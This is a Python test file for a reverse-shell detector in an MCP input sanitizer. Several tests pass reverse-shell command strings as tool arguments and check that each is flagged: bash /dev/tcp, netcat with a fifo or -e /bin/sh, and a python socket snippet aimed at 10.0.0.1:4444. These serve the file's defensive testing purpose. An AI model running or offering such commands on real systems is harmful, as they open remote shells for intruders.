"""Tests for reverse shell detection in input_sanitizer."""

from mcp_watchdog.input_sanitizer import InputSanitizer


def test_bash_reverse_shell():
    s = InputSanitizer()
    alerts = s.scan_arguments(
        "server-1", "exec", {"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444"}
    )
    reasons = {a.reason for a in alerts}
    assert "reverse_shell" in reasons


def test_nc_reverse_shell():
    s = InputSanitizer()
    alerts = s.scan_arguments(
        "server-1", "exec", {"cmd": "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f"}  # attack payload uses Unix paths intentionally
    )
    reasons = {a.reason for a in alerts}
    assert "reverse_shell" in reasons


def test_python_reverse_shell():
    s = InputSanitizer()
    alerts = s.scan_arguments(
        "server-1", "exec", {"cmd": "python3 -c 'import socket,subprocess;s=socket.connect()'"}
    )
    reasons = {a.reason for a in alerts}
    assert "reverse_shell" in reasons


def test_nc_with_execute_flag():
    s = InputSanitizer()
    alerts = s.scan_arguments(
        "server-1", "exec", {"cmd": "nc -e /bin/sh 10.0.0.1 4444"}
    )
    reasons = {a.reason for a in alerts}
    assert "reverse_shell" in reasons


def test_clean_command_no_alert():
    s = InputSanitizer()
    alerts = s.scan_arguments(
        "server-1", "exec", {"cmd": "echo hello world"}
    )
    reasons = {a.reason for a in alerts}
    assert "reverse_shell" not in reasons
